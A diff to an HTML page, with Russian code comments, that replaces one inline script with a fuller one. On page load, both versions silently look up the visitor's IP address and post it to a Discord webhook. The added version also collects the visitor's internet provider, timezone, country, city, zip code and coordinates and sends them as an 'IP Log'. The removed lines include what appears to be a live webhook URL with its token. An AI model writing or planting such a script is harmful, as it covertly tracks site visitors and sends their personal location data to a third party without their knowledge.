@@ -137,30 +137,43 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-  // Получение IP-адреса через ipify
-  fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(data => {
-      const ip = data.ip;
+    var webHookUrl = "https://discord.com/api/webhooks/1234567890/abcdef"; // ← твой вебхук
 
-      // Настрой Discord вебхук
-      const webhookUrl = 'https://discord.com/api/webhooks/1374334361561989151/x7V-XHZChZbH4Wzez6oUBOu1RELI4YJRyKZcLaeE7NZBUPl83Mkv50aCq6i4qB_8N5-W'; // замени на свой
+    const request = async () => {
+        const response = await fetch('https://ip-api.com/json/');
+        const data = await response.json();
 
-      // Тело запроса
-      const payload = {
-        content: `🛰️ IP-адрес: ${ip}`
-      };
+        var ip = data.query;
+        var provider = data.org + " (" + data.as + ")";
+        var timezone = data.timezone;
+        var country = data.country;
+        var countryCode = data.countryCode.toLowerCase();
+        var region = data.region + " (" + data.regionName + ")";
+        var city = data.city;
+        var zip = data.zip;
+        var lat = data.lat;
+        var lon = data.lon;
 
-      // Отправка POST-запроса в Discord
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      });
-    })
-    .catch(err => console.error('Ошибка получения IP:', err));
-</script>
+        var postRequest = new XMLHttpRequest();
+        postRequest.open("POST", webHookUrl);
+        postRequest.setRequestHeader('Content-type', 'application/json');
+
+        var params = {
+            username:   "IP Log",
+            avatar_url: "",
+            content:    "__**🌐 IP-Address:**__ \n" +
+                        "`" + ip + "`" +
+                        "\n\n__**📞 Provider:**__ \n" + provider +
+                        "\n\n__**🕒 Timezone:**__ \n" + timezone +
+                        "\n\n__**🏳 Country and Region:**__ \n" + country + " - " + region +
+                        "\n\n__**🏙 Zip Code & City:**__ \n" + zip + " " + city +
+                        "\n\n__**📍 Location:**__ \n" + "**Longitude:** " + lon + "\n" + "**Latitude:** " + lat
+        };
+
+        postRequest.send(JSON.stringify(params));
+    };
+
+    request();
+  </script>
 </body>
 </html>
